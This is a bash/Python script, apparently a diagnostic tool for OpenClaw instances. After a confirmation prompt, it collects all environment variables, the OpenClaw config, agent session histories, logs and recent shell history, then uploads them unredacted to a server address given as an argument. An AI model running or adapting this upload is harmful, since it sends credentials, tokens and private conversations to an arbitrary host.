#!/bin/bash
echo "本脚本将收集以下信息并发送至诊断服务器："
echo "[实例信息]"
echo "- 实例 ID"
echo "- 空间 ID"
echo "- 实例创建时间"
echo "[系统信息]"
echo "- 环境变量"
echo "- 历史执行过的命令"
echo "[Claw 信息]"
echo "- OpenClaw 配置 (~/.openclaw/openclaw.json)"
echo "- 会话历史 (~/.openclaw/agents/main/sessions/)"
echo "- OpenClaw 日志 (/tmp/openclaw/)"
echo "- 历史命令 (~/.bash_history 近100条)"
echo ""
read -p "确认继续？(y/N) " c
[[ "$c" != [yY] ]] && echo "已取消" && exit 0

IP_ADDR="${1:?用法: bash diagnosis.sh IP_ADDR}"
DIAG_SERVER="${IP_ADDR}"

python3 - "$DIAG_SERVER" << 'PYEOF'
import json, glob, os, sys, time, urllib.request

home = os.path.expanduser("~")

print("收集实例信息...", flush=True)
report_id = str(int(time.time() * 1000))
instance_created = os.popen('stat -c "%y" /var/log/cloud-init.log 2>/dev/null').read().strip()

print("收集环境变量...", flush=True)
env_vars = dict(l.split("=", 1) for l in os.popen("env").read().strip().split("\n") if "=" in l)

print("收集 OpenClaw 配置...", flush=True)
config_path = f"{home}/.openclaw/openclaw.json"
claw_config = json.load(open(config_path)) if os.path.exists(config_path) else {}

print("收集会话历史...", flush=True)
session_files = sorted(glob.glob(f"{home}/.openclaw/agents/main/sessions/*.jsonl"))
sessions = []
for f in session_files:
    print(f"  读取 {os.path.basename(f)}...", flush=True)
    msgs = []
    for l in open(f):
        if l.strip():
            try:
                msgs.append(json.loads(l))
            except json.JSONDecodeError:
                pass
    sessions.append({"name": os.path.basename(f), "messages": msgs})

print("收集日志...", flush=True)
log_files = sorted(glob.glob("/tmp/openclaw/openclaw-*.log"))[-1:]
logs = []
for f in log_files:
    print(f"  读取 {os.path.basename(f)}...", flush=True)
    entries = []
    for l in open(f):
        if l.strip():
            try:
                entries.append(json.loads(l))
            except json.JSONDecodeError:
                pass
    logs.append({"name": os.path.basename(f), "entries": entries})

print("收集历史命令...", flush=True)
history_path = f"{home}/.bash_history"
history = open(history_path).read().strip().split("\n")[-100:] if os.path.exists(history_path) else []

data = {
    "id": report_id,
    "instanceCreatedAt": instance_created,
    "envVars": env_vars,
    "clawConfig": claw_config,
    "sessions": sessions,
    "logs": logs,
    "history": history,
}

print("序列化数据...", flush=True)
payload = json.dumps(data).encode()
print(f"数据大小: {len(payload) / 1024 / 1024:.1f} MB", flush=True)

print("上传数据...", flush=True)
server = sys.argv[1]
req = urllib.request.Request(server + "/api/report", payload, {"Content-Type": "application/json"})
urllib.request.urlopen(req, timeout=120)
print("Done! Report ID:", data["id"])
PYEOF
